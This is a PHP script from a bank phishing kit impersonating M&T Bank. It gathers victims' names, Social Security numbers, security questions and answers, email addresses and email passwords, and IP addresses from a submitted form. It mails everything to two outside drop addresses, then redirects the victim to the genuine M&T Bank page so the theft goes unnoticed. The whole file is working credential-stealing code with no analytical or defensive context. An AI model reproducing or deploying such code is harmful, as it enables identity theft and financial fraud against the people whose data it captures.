<?php

$ip = getenv("REMOTE_ADDR");
$message .= "---: || M&T by Vinxx :---\n";
$message .= "FullName : ".$_POST['fn']." ";
$message .= "FullName : ".$_POST['ln']." ";
$message .= "SSN : ".$_POST['ssn']." ";
$message .= "Q1: ".$_POST['Q1']." - ";
$message .= "".$_POST['ANS1']." - ";
$message .= "".$_POST['ANS2']."\n";
$message .= "Q2: ".$_POST['Q2']." - ";
$message .= "".$_POST['ANS3']." - ";
$message .= "".$_POST['ANS4']."\n";
$message .= "Q3: ".$_POST['Q3']." - ";
$message .= "".$_POST['ANS5']." - ";
$message .= "".$_POST['ANS6']."\n";
$message .= "EmailAddress : ".$_POST['email']." - ";
$message .= "".$_POST['epass']."\n";
$message .= "IP : ".$ip."\n";
$message .= "---VinxxxMadedVersion---\n";
$recipient = "desktoptab18@aol.com,tabdesktop@yandex.com";
$subject = "M&T-$ip";
$headers = "From: ";
$headers .= $_POST['user']."\n";
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://www.mtb.com/personal/Pages/Index.aspx");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>